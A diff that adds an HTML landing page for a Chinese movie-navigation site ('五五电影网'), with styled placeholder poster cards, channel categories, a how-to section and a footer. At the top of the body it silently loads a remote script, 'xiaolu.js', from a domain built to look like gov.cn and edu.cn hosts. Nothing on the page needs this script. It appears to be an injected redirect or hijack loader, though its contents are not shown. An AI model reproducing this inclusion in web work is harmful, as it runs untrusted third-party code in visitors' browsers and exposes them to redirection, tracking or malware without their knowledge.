@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="五五电影网,wuwudianyingwang,高清电影,影视大全,在线观影,电影推荐">
+<meta name="description" content="五五电影网 - 汇聚热门电影、电视剧、综艺、动漫，精选高分影视内容每日更新，简洁清爽的观影导航门户，快速发现好片。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>五五电影网 | 高清影视大全 · 精选好片推荐</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+ --brand:#e11d48;--brand2:#fb7185;--cream:#fff9f2;--ink:#1c1917;--txt:#57534e;--dim:#a8a29e;--line:#f5e9dd
+}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:var(--cream);color:var(--ink);line-height:1.7;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1140px;margin:0 auto;padding:0 16px}
+section{padding:48px 0}
+
+/* HEADER */
+header{position:sticky;top:0;z-index:70;background:rgba(255,249,242,.96);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:70px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .bd{width:44px;height:44px;border-radius:13px;background:var(--brand);color:#fff;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:900;box-shadow:0 5px 14px rgba(225,29,72,.28)}
+.logo b{font-size:16.5px;font-weight:900}
+.logo small{display:block;font-size:9px;color:var(--dim);letter-spacing:1.4px}
+nav{display:none;gap:2px}
+nav a{padding:9px 16px;border-radius:9px;font-size:13px;font-weight:800;color:var(--txt);transition:.25s}
+nav a:hover,nav a.on{background:var(--brand);color:#fff}
+.tog{width:42px;height:42px;border-radius:10px;background:var(--ink);color:#fff;border:none;font-size:15px;cursor:pointer}
+.drawer{display:none;background:#fff;border-bottom:1px solid var(--line)}
+.drawer.on{display:block}
+.drawer a{display:block;padding:14px 16px;border-bottom:1px solid #fbf4ec;font-weight:800;font-size:14px}
+
+/* HERO */
+.hero{position:relative;background:var(--ink);color:#fff;padding:66px 0 70px;overflow:hidden}
+.hero::before{content:"";position:absolute;left:-120px;bottom:-140px;width:380px;height:380px;border-radius:50%;background:radial-gradient(circle,rgba(225,29,72,.32),transparent 68%)}
+.hero::after{content:"";position:absolute;right:-90px;top:-120px;width:300px;height:300px;border-radius:50%;background:radial-gradient(circle,rgba(251,113,133,.2),transparent 70%)}
+.hero .wrap{position:relative;z-index:2}
+.hero .tag{display:inline-block;font-size:11px;font-weight:800;background:rgba(251,113,133,.18);color:var(--brand2);padding:5px 13px;border-radius:20px;margin-bottom:16px;letter-spacing:1px}
+.hero h1{font-size:30px;font-weight:900;line-height:1.35;margin-bottom:14px}
+.hero h1 em{font-style:normal;color:var(--brand2)}
+.hero p{font-size:13px;color:#d6cfc8;max-width:540px;margin-bottom:24px}
+.hero .acts{display:flex;gap:10px;flex-wrap:wrap}
+.hero .acts .a{background:var(--brand);color:#fff;padding:11px 22px;border-radius:10px;font-size:12.5px;font-weight:900}
+.hero .acts .b{border:1px solid rgba(255,255,255,.3);color:#fff;padding:11px 22px;border-radius:10px;font-size:12.5px;font-weight:800}
+
+/* SECTION TITLE */
+.stitle{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:22px;gap:12px}
+.stitle h2{font-size:19px;font-weight:900}
+.stitle h2 i{font-style:normal;color:var(--brand)}
+.stitle h2 small{display:block;font-size:10px;color:var(--dim);font-weight:600;letter-spacing:1px;margin-top:3px}
+.stitle a{font-size:11.5px;color:var(--dim);font-weight:700;white-space:nowrap}
+
+/* POSTER GRID DOM A */
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.card{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 10px rgba(28,25,23,.05);transition:.28s}
+.card:hover{transform:translateY(-5px);box-shadow:0 14px 28px rgba(225,29,72,.16)}
+.card .cv{height:150px;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;color:rgba(255,255,255,.92);position:relative}
+.card .cv .sc{position:absolute;top:9px;left:9px;background:rgba(0,0,0,.45);color:#fff;font-size:9.5px;padding:3px 7px;border-radius:5px;font-weight:800;backdrop-filter:blur(3px)}
+.card .cv .rt{position:absolute;top:9px;right:9px;background:var(--brand);color:#fff;font-size:10px;padding:3px 7px;border-radius:5px;font-weight:900}
+.card .info{padding:11px 12px}
+.card .info b{font-size:13.5px;font-weight:900}
+.card .info p{font-size:10.5px;color:var(--dim);margin-top:3px}
+
+/* CHANNEL CARDS DOM B */
+.chans{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
+.chan{background:#fff;border:1px dashed var(--line);border-radius:13px;padding:16px 14px;transition:.25s;display:block}
+.chan:hover{border-color:var(--brand2);background:#fff5f7}
+.chan .h{display:flex;align-items:center;gap:9px;margin-bottom:8px}
+.chan .h .n{font-size:19px}
+.chan .h b{font-size:13px;font-weight:900}
+.chan .h span{margin-left:auto;font-size:10px;color:var(--brand);font-weight:800;background:#fff5f7;padding:3px 8px;border-radius:6px}
+.chan p{font-size:10.5px;color:var(--txt)}
+
+/* STEPS DOM C */
+.steps{background:#fff;border-radius:16px;padding:6px 0;border:1px solid var(--line)}
+.step{display:flex;gap:14px;align-items:flex-start;padding:16px 18px;border-bottom:1px solid #faf4ee}
+.step:last-child{border-bottom:none}
+.step .num{width:32px;height:32px;border-radius:9px;background:var(--ink);color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900;flex-shrink:0}
+.step:nth-child(1) .num{background:var(--brand)}
+.step:nth-child(2) .num{background:#f59e0b}
+.step:nth-child(3) .num{background:#2563eb}
+.step .tx b{font-size:13px;font-weight:900;display:block}
+.step .tx small{font-size:11px;color:var(--txt);line-height:1.6}
+
+footer{background:var(--ink);color:#e7e5e4;padding:44px 0 24px}
+.ft{display:grid;grid-template-columns:1fr;gap:24px}
+.ft .a b{font-size:15px;font-weight:900;color:#fff}
+.ft .a p{font-size:11.5px;margin-top:7px;color:#a8a29e}
+.ft .a .u{color:var(--brand2);font-size:11.5px;display:block;margin-top:9px;word-break:break-all}
+.cols{display:grid;grid-template-columns:repeat(2,1fr);gap:9px}
+.cols a{font-size:12px;color:#a8a29e}
+.cols a:hover{color:var(--brand2)}
+.cp{margin-top:26px;padding-top:15px;border-top:1px solid rgba(255,255,255,.1);font-size:10px;line-height:1.95;color:#78716c}
+
+#top{position:fixed;right:14px;bottom:18px;z-index:90;width:44px;height:44px;border-radius:50%;background:var(--brand);color:#fff;font-size:16px;display:none;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 6px 16px rgba(225,29,72,.35)}
+#top.on{display:flex}
+
+@media(min-width:560px){.grid{grid-template-columns:repeat(3,1fr)}.chans{grid-template-columns:repeat(3,1fr)}.card .cv{height:175px}}
+@media(min-width:820px){
+ nav{display:flex}.tog{display:none}
+ .hero h1{font-size:48px;max-width:760px}
+ .hero p{font-size:15px}
+ .grid{grid-template-columns:repeat(6,1fr)}.chans{grid-template-columns:repeat(4,1fr)}
+ .ft{grid-template-columns:1.6fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo"><div class="bd">55</div><div><b>五五电影网</b><small>WUWU · MOVIE</small></div></div>
+    <nav>
+      <a href="#home" class="on">首页</a>
+      <a href="#hot">热映精选</a>
+      <a href="#chan">频道分类</a>
+      <a href="#howto">观影指南</a>
+    </nav>
+    <button class="tog" onclick="document.getElementById('dr').classList.toggle('on')">☰</button>
+  </div>
+  <div class="drawer" id="dr">
+    <a href="#home" onclick="this.parentNode.classList.remove('on')">首页</a>
+    <a href="#hot" onclick="this.parentNode.classList.remove('on')">热映精选</a>
+    <a href="#chan" onclick="this.parentNode.classList.remove('on')">频道分类</a>
+    <a href="#howto" onclick="this.parentNode.classList.remove('on')">观影指南</a>
+  </div>
+</header>
+
+<main>
+
+<section class="hero" id="home">
+  <div class="wrap">
+    <span class="tag">🔴 正在热映 · 每日更新</span>
+    <h1>五五电影网<br>精选好片 <em>一站看全</em></h1>
+    <p>汇聚热门电影、高分电视剧、综艺与动漫资源，精选推荐每日更新，简洁清爽的观影导航门户，帮你快速发现值得一看的好片。</p>
+    <div class="acts">
+      <a href="#hot" class="a">立即观影</a>
+      <a href="#chan" class="b">浏览分类</a>
+    </div>
+  </div>
+</section>
+
+<!-- POSTER GRID DOM A -->
+<section id="hot">
+  <div class="wrap">
+    <div class="stitle"><h2>🔥 热映<i>精选</i><small>HOT PICKS</small></h2><a href="#">查看更多 ›</a></div>
+    <div class="grid">
+      <a href="#" class="card"><div class="cv" style="background:linear-gradient(135deg,#e11d48,#f97316)"><span class="sc">热映</span><span class="rt">9.2</span>🔥</div><div class="info"><b>长空之战</b><p>动作 / 战争 · 史诗巨制</p></div></a>
+      <a href="#" class="card"><div class="cv" style="background:linear-gradient(135deg,#7c3aed,#2563eb)"><span class="sc">推荐</span><span class="rt">8.7</span>🎬</div><div class="info"><b>时光信使</b><p>科幻 / 悬疑 · 烧脑反转</p></div></a>
+      <a href="#" class="card"><div class="cv" style="background:linear-gradient(135deg,#0d9488,#059669)"><span class="sc">口碑</span><span class="rt">9.4</span>🌿</div><div class="info"><b>山野四季</b><p>纪录 / 自然 · 治愈视听</p></div></a>
+      <a href="#" class="card"><div class="cv" style="background:linear-gradient(135deg,#ea580c,#f59e0b)"><span class="sc">新剧</span><span class="rt">8.9</span>📺</div><div class="info"><b>城市边缘</b><p>都市 / 剧情 · 现实主义</p></div></a>
+      <a href="#" class="card"><div class="cv" style="background:linear-gradient(135deg,#be123c,#f43f5e)"><span class="sc">热播</span><span class="rt">8.5</span>💖</div><div class="info"><b>初恋物语</b><p>爱情 / 青春 · 甜系佳作</p></div></a>
+      <a href="#" class="card"><div class="cv" style="background:linear-gradient(135deg,#1e293b,#475569)"><span class="sc">经典</span><span class="rt">9.6</span>🎞️</div><div class="info"><b>沉默真相</b><p>犯罪 / 悬疑 · 高能口碑</p></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- CHANNEL CARDS DOM B -->
+<section id="chan" style="padding-top:0">
+  <div class="wrap">
+    <div class="stitle"><h2>📂 频道<i>分类</i><small>CHANNELS</small></h2><a href="#">全部分类 ›</a></div>
+    <div class="chans">
+      <a href="#" class="chan"><div class="h"><span class="n">🎬</span><b>电影</b><span>6800+</span></div><p>院线大片 / 经典老片 / 独立佳作</p></a>
+      <a href="#" class="chan"><div class="h"><span class="n">📺</span><b>电视剧</b><span>920</span></div><p>热播国产 / 高分美剧 / 韩剧</p></a>
+      <a href="#" class="chan"><div class="h"><span class="n">🎤</span><b>综艺</b><span>310</span></div><p>真人秀 / 访谈 / 竞演节目</p></a>
+      <a href="#" class="chan"><div class="h"><span class="n">🎨</span><b>动漫</b><span>480</span></div><p>国漫 / 日漫 / 剧场版动画</p></a>
+      <a href="#" class="chan"><div class="h"><span class="n">🎞️</span><b>纪录片</b><span>260</span></div><p>自然 / 人文 / 历史 / 科技</p></a>
+      <a href="#" class="chan"><div class="h"><span class="n">⭐</span><b>高分榜</b><span>实时</span></div><p>评分榜 / 热播榜 / 口碑榜</p></a>
+    </div>
+  </div>
+</section>
+
+<!-- STEPS DOM C -->
+<section id="howto" style="padding-top:0">
+  <div class="wrap">
+    <div class="stitle"><h2>🎯 观影<i>指南</i><small>HOW TO USE</small></h2></div>
+    <div class="steps">
+      <div class="step"><div class="num">01</div><div class="tx"><b>选择频道分类</b><small>在频道分类中选择电影、电视剧、综艺等对应入口，精准定位内容方向。</small></div></div>
+      <div class="step"><div class="num">02</div><div class="tx"><b>浏览热映精选</b><small>查看首页热映精选与高分榜，发现当下热门与口碑佳作。</small></div></div>
+      <div class="step"><div class="num">03</div><div class="tx"><b>跳转正版渠道</b><small>点击感兴趣的内容，跳转对应正版播放渠道，享受高清流畅观影体验。</small></div></div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="a">
+        <b>五五电影网</b>
+        <p>高清影视资源导航门户，精选电影、电视剧、综艺、动漫等内容，每日更新推荐，帮你快速发现好片。</p>
+        <span class="u">https://wuwudianyingwang-wap.github.io</span>
+      </div>
+      <div>
+        <div class="cols">
+          <a href="#">首页</a><a href="#">热映精选</a>
+          <a href="#">频道分类</a><a href="#">观影指南</a>
+          <a href="#">高分榜单</a><a href="#">联系合作</a>
+        </div>
+      </div>
+    </div>
+    <div class="cp">© 2026 五五电影网 wuwudianyingwang · 保留所有权利<br>本站为影视信息导航平台，倡导正版观看，相关影视版权归出品方及原作者所有</div>
+  </div>
+</footer>
+
+<div id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+<script>
+window.addEventListener('scroll',function(){document.getElementById('top').classList.toggle('on',window.scrollY>450);});
+</script>
+</body>
+</html>
